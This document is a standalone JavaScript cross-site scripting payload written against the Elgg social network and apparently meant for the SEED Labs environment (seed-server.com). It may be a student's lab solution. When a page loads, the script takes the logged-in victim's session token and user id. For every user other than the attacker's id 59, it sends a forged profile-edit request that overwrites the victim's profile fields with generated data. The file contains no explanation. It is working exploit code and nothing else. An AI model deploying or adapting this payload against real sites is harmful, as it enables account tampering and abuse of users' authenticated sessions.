<script type="text/javascript">
  window.onload = function() {
	if (typeof elgg !== 'undefined'){
        if(elgg.security && elgg.security.token && elgg.session && elgg.session.user) {
            var ts = elgg.security.token.__elgg_ts;
            var token = elgg.security.token.__elgg_token;
            var loggedInUserId = elgg.session.user.guid;

            var myID = 59; 

            if(loggedInUserId !== 59) {
                var sendurl = "http://www.seed-server.com/action/profile/edit";

                function getDescription() {
                    var description = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer eget dui vitae velit congue vestibulum. ';
                    return description;
                }

                
                function getRandomLocation() {
                    const locations = [
                        "New York City, USA",
                        "Tokyo, Japan",
                        "Paris, France",
                        "Sydney, Australia",
                        "Rio de Janeiro, Brazil",
                        "Cape Town, South Africa",
                        "Rome, Italy",
                        "Mumbai, India",
                        "Reykjavik, Iceland",
                        "Buenos Aires, Argentina"
                        ];

                    const randomIndex = Math.floor(Math.random() * locations.length);
                    return locations[randomIndex];
                }

                function getRandomPhoneNumber() {
                    const bangladeshPhoneNumbers = [
                        "+8801712345678",
                        "+8801812345678",
                        "+8801912345678",
                        "+8801512345678",
                        "+8801612345678",
                        "+8801412345678",
                        "+8801312345678",
                        "+8801212345678",
                        "+8801112345678",
                        "+8801912345679"
                      ];
                      
                    const randomIndex = Math.floor(Math.random() * bangladeshPhoneNumbers.length);
                    return bangladeshPhoneNumbers[randomIndex];
                }
                
        
                function getRandomUrl() {
                    const urls = [
                        "https://www.example1.com",
                        "https://www.example2.com",
                        "https://www.example3.com",
                        "https://www.example4.com",
                        "https://www.example5.com",
                        "https://www.example6.com",
                        "https://www.example7.com",
                        "https://www.example8.com",
                        "https://www.example9.com",
                        "https://www.example10.com"
                      ];
                
                    const randomIndex = Math.floor(Math.random() * urls.length);
                    return urls[randomIndex];
                }

                function generateRandomEmail() {
                    const domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com"];
                    const randomDomain = domains[Math.floor(Math.random() * domains.length)];
                    
                    const usernameLength = Math.floor(Math.random() * (10 - 5) + 5); 
                    let username = "";
                    const possibleChars = "abcdefghijklmnopqrstuvwxyz0123456789";
                  
                    for (let i = 0; i < usernameLength; i++) {
                      username += possibleChars.charAt(Math.floor(Math.random() * possibleChars.length));
                    }
                  
                    return `${username}@${randomDomain}`;
                }

                function getRandomSkill() {
                    const skills = [
                      "JavaScript",
                      "Python",
                      "HTML",
                      "CSS",
                      "React",
                      "Node.js",
                      "SQL",
                      "Java",
                      "C++",
                      "Ruby"
                    ];
                  
                    const randomIndex = Math.floor(Math.random() * skills.length);
                    return skills[randomIndex];
                }

                function generateRandomTwitterHandle() {
                    const prefixes = ["@", "_", "", "the"];
                    const suffixes = ["coder", "developer", "programmer", "geek", "ninja", "guru", "hero", "wizard", "hacker"];
                    const numbers = Math.floor(Math.random() * 10000);
                    
                    const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
                    const randomSuffix = suffixes[Math.floor(Math.random() * suffixes.length)];
                    
                    return `${randomPrefix}${randomSuffix}${numbers}`;
                }
                  
            
        
                var content =
                    "__elgg_token=" + token +
                    "&__elgg_ts=" + ts +
                    "&description=1905107" +
                    "&accesslevel[description]=1" +       	
                    "&briefdescription=" + "1905107"+
                    "&accesslevel[briefdescription]=1" +
                    "&location=" + getRandomLocation() +
                    "&accesslevel[location]=1" +
                    "&interests=" + getRandomSkill() +
                    "&accesslevel[interests]=1" +
                    "&skills=" + getRandomSkill() +
                    "&accesslevel[skills]=1" +
                    "&contactemail=" + generateRandomEmail() +
                    "&accesslevel[contactemail]=1" +
                    "&phone=" + getRandomPhoneNumber() +
                    "&accesslevel[phone]=1" +
                    "&mobile=" + getRandomPhoneNumber() +
                    "&accesslevel[mobile]=1" +
                    "&website=" + getRandomUrl() +
                    "&accesslevel[website]=1" +
                    "&twitter=" + generateRandomTwitterHandle() +
                    "&accesslevel[twitter]=1" +
                    "&guid=" + loggedInUserId;
        
                var Ajax = new XMLHttpRequest();
                Ajax.open("POST", sendurl, true);
                Ajax.setRequestHeader("Host", "www.seed-server.com");
                Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                Ajax.onreadystatechange = function() {
                    if (Ajax.readyState === XMLHttpRequest.DONE) {
                        var status = Ajax.status;
                        if (status === 0 || (status >= 200 && status < 400)) {
                            console.log("Profile updated successfully");
                        } else {
                            console.error("Error while updating profile");
                        }
                    }
                };
                Ajax.send(content);
            }
        }
    }
}
  </script>
    